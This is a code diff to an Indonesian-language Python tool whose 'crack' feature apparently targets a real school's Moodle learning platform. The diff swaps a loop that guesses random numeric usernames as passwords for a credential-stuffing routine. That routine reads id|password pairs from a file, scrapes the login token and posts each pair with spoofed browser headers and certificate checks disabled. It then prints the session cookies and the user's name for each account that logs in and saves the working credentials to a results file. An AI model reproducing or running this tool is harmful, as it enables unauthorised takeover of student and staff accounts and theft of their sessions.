@@ -15,7 +15,7 @@ from rich.table import Table as me
 from rich.tree import Tree
 from rich.columns import Columns as Columns
 from rich.console import Console as sol,Console
-
+from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 # -------------[ IMPORT TO SELENIUM ]------------- #
 
 from selenium import webdriver
@@ -35,6 +35,11 @@ console = Console()
 session = requests.Session()
 Meledakcik=[]
 
+session = requests.Session()
+id_list = []
+ok = 0
+cp = 0
+loop = 0
 # -------------[ CHECK TOKEN AND COOKIE ]------------- #
 
 def check_token_cookie():
@@ -178,9 +183,11 @@ def menu():
     elif i == "7":
         absensi()
     elif i == "8":
-        crack()
-    elif i == "9":
         os.system("python3 crack.py")
+    elif i == "9":
+        file_name = input("Masukkan nama file (contoh: akun.txt): ")
+        load_ids(file_name)
+        crack()
     elif i == "0":
         exit()
         
@@ -568,87 +575,121 @@ def autochangepas():
 
 # -------------[ GENERATOR CRACK TO USERNAME AND PASSWORD ]------------- #
 
-def generat():
-    random_number = random.randint(10000000, 100000000 - 1)
-    formatted_number = f"{random_number:010d}"
-    return formatted_number
-
-# -------------[ MENU CRACK ]------------- #
-
+def load_ids(file_path):
+    try:
+        with open(file_path, 'r') as f:
+            lines = f.readlines()
+            for line in lines:
+                parts = line.strip().split('|')
+                if len(parts) == 2:
+                    id_list.append({'id': parts[0], 'password': parts[1]})
+                else:
+                    console.print(f"[red]Format tidak valid: {line.strip()}[/red]")
+        console.print(f"[green]Berhasil memuat {len(id_list)} akun dari file {file_path}[/green]")
+    except FileNotFoundError:
+        console.print(f"[red]File {file_path} tidak ditemukan[/red]")
+        exit()
+        
+        
 def crack():
-    while True:
-        try:
-            print('')
-            idf = generat()
-            time.sleep(1)
-            p = session.get("https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
-            logintoken_match = re.search('name="logintoken" value="(.*?)"', str(p.text))
-            
-            if not logintoken_match:
-                prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
-                return
-            logintoken = logintoken_match.group(1)
-            heade = {
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Encoding': 'gzip, deflate, br, zstd',
-                'Host': 'lms.smkn4padalarang.sch.id',
-                'Referer': 'https://lms.smkn4padalarang.sch.id/',
-                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-                'Sec-Ch-Ua-Mobile': '?0',
-                'Sec-Ch-Ua-Platform': '"Windows"',
-                'Upgrade-Insecure-Requests': '1',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Cache-Control': 'max-age=0',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
-            }
-            data = {
-                "logintoken": logintoken,
-                "username": idf,
-                "password": idf
-            }
-            response = session.post(
-                "https://lms.smkn4padalarang.sch.id/login/index.php",
-                headers=heade,
-                data=data,
-                allow_redirects=True,
-                verify=False
-            )
+    global loop, ok, cp
+    prog = Progress(
+        SpinnerColumn('clock'),
+        TextColumn('[progress.description]{task.description}'),
+        BarColumn(),
+        TextColumn('{task.percentage:.0f}%'),
+        transient=True,
+    )
+    task_id = prog.add_task("Cracking...", total=len(id_list))
 
-            if 'Dashboard' in response.text:
-                cookies = "; ".join([
-                    f"{key}={value}"
-                    for key, value in session.cookies.get_dict().items()
-                ])
-                # Output keberhasilan
-                Meledak = Tree(Panel.fit("[bold green]Log in Success"))
-                Meledak.add(Panel.fit(f"[bold green]Username: {idf}, Password: {idf}"))
-                Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
-                try:
-                    session.cookies.update({key: value for key, value in (item.split('=') for item in cookies.split('; '))})
-                    url = "https://lms.smkn4padalarang.sch.id/my/"
-                    response = session.get(url, verify=False)
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    user_element = soup.find('span', class_='usertext')
-                    if user_element:
-                        user_name = user_element.text.strip()
-                    else:
-                        user_name = "Pengguna Tidak Diketahui"
-                except IOError :
-                    prints(Panel.fit(f"Pengguna tidak diketahui"))
-                Meledak.add(Panel.fit(f"[bold green]User Pengguna: {user_name}"))
-                prints(Meledak)
-                open('data-success.txt','a').write(idf+"|"+idf+"\n")
-                break  # Exit loop if login is successful
+    with prog:
+        for account in id_list:
+            uid = account['id']
+            pw = account['password']
+            if attempt_login(uid, pw):
+                prog.update(task_id, advance=1)
+                break  # Stop the loop if login is successful
             else:
-                prints(Panel.fit(f"[bold red]Username {idf} atau password {idf} salah, coba lagi!"))
-                open('data-fail.txt','a').write(idf+"|"+idf+"\n")
-        except Exception as e:
-            prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}"))
+                prog.update(task_id, advance=1)
+            loop += 1
 
+            
+            
+def attempt_login(uid, password):
+    global ok, cp
+    try:
+        response = session.get(f"https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
+        logintoken_match = re.search('name="logintoken" value="(.*?)"', str(response.text))
+        if not logintoken_match:
+            prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
+            return
+        logintoken = logintoken_match.group(1)
+
+        data = {
+            "logintoken": logintoken,
+            "username": uid,
+            "password": password
+        }
+        
+        headers = {
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Host': 'lms.smkn4padalarang.sch.id',
+            'Referer': 'https://lms.smkn4padalarang.sch.id/',
+            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Upgrade-Insecure-Requests': '1',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+        }
+        
+        login_response = session.post(
+            "https://lms.smkn4padalarang.sch.id/login/index.php",
+            data=data,
+            headers=headers,
+            allow_redirects=True,
+            verify=False
+        )
+        if "Dashboard" in login_response.text:
+            cookies = "; ".join([
+                f"{key}={value}"
+                for key, value in session.cookies.get_dict().items()
+            ])
+            session.cookies.update({key: value for key, value in (item.split('=') for item in cookies.split('; '))})
+            url = "https://lms.smkn4padalarang.sch.id/my/"
+            response = session.get(url, verify=False)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            user_element = soup.find('span', class_='usertext')
+            if user_element:
+                user_name = user_element.text.strip()
+            else:
+                user_name = "Pengguna Tidak Diketahui"
+            Meledak = Tree(Panel.fit(f"[bold green]{user_name} Login Berhasil"))
+            Meledak.add(Panel.fit(f"[bold green]Username: {uid}, Password: {password}"))
+            Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
+            prints(Meledak)
+            save_result("OK", uid, password)
+            ok += 1
+            return True
+        else:
+            return False
+    except Exception as e:
+        console.print(f"[red]Kesalahan: {e}[/red]")
+        return False
+
+def save_result(folder, uid, password):
+    if not os.path.exists(folder):
+        os.makedirs(folder)
+    with open(f"{folder}/results.txt", 'a') as f:
+        f.write(f"{uid}|{password}\n")
+        
+        
 # -------------[ MENU RUN OVERFLOW ]------------- #
 
 if __name__ == "__main__":
